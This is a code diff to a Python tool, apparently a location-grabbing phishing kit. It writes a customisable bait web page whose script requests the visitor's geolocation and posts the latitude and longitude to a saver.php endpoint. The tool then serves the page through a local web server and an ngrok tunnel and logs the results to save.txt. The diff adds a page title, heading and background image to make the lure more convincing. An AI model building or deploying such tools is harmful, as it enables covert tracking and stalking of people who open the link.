@@ -10,6 +10,7 @@ Created By: EH
 """
 file_dir = " "
 dir_name = " "
+html_image = " "
 
 def check_system():
     if sys.platform == "linux" or sys.platform == "linux2":
@@ -19,41 +20,56 @@ def check_system():
         os.system("cls")
         return "win32"
 
-def htmls_clientside():
-    
+def htmls_clientside(user):
+    global html_image
+
+    if user == "y":
+        html_title = str(input("\033[1;32m webpage title: \033[1;m"))
+        html_h1 = str(input("\033[1;32m h1 text on webpage: \033[1;m"))
+        html_image = str(input("\033[1;32m image file should be jpg : \033[1;m"))
+        html_px1 = str(input("\033[1;32m pixel-width: \033[1;m"))
+        html_px2 = str(input("\033[1;32m pixel-height: \033[1;m"))
+    elif user == "n":
+        html_title = "EH"
+        html_h1 = "EH"
+        html_image = "Anonymous.jpg" 
+        html_px1 = "1000"
+        html_px2 = "1600"
+    else:
+        print("\033[1;36m ERROR \033[1;m")
+         
     indexfile = """ 
 
 <!DOCTYPE html>
 <html>
     <head>
-        <title>EH</title>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <title>%s</title>
+        <style type="text/css">
+            body {
+            background-image: url("%s");
+            background-size: %spx %spx;
+            background-repeat: no-repeat;
+        }
+        </style>
     </head>
 
     <body>
-        <h1>EH</h1>
-        
+        <h1>%s</h1>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
         <script type="text/javascript">
-               window.onload=function(){
-                   if(navigator.geolocation)
-                   {
-                       navigator.geolocation.getCurrentPosition(showPosition);
-                    }
-                    else{
-                        alert("Geolocation is not supported by this browser.");
-                    }
-                }
-                function showPosition(pos){
-                    $.post('saver.php',{'lat':pos.coords.latitude,'lng':pos.coords.longitude},function(res){
-                        console.log(res);
-                    });
-                }
+            navigator.geolocation.getCurrentPosition(positon)
+
+            function positon(location){
+                $.post('saver.php', {'lat':location.coords.latitude, 'lng':location.coords.longitude},function(res){
+                    console.log(res);
+                })
+            }
 
 
         </script>
     </body>
 </html>
-    """
+    """%(html_title, html_image.strip(" F : f \ /"), html_px1, html_px2, html_h1)
     opnr = open("index.html", "w")
     opnr.write(indexfile)
     opnr.close()
@@ -131,9 +147,32 @@ def cpaste_windows():
 
     return 0
 
+def cpaste_image():
+    global dir_name, file_dir
+
+    try:
+        filename = html_image
+        if check_system() == "win32":
+            write_file = dir_name + "/" + filename.strip("f F : / \ ")
+        else:
+            write_file = "/var/www/html/" + filename
+        
+        opnr = open(filename, "rb")
+        data = opnr.read()
+        opnr.close()
+
+        opnr = open(write_file, "wb")
+        opnr.write(data)
+        opnr.close()
+    except FileNotFoundError:
+        return 1
+
+    return 0
+
 def startscript():
     check_system()
-    htmls_clientside()
+    user_input = str(input("\033[1;32m Do you want to modify the Index HTML file y/n: "))
+    htmls_clientside(user_input)
     server_side()
 
     if check_system() == "linux":
@@ -156,6 +195,9 @@ def startscript():
         os.system("start call ngrok_win32 http 80")
         file_dir = dir_name + "/save.txt"
         os.system("cls")
+    
+    cpaste_image()
+    check_system()
 
 if __name__ == "__main__":
     startscript()
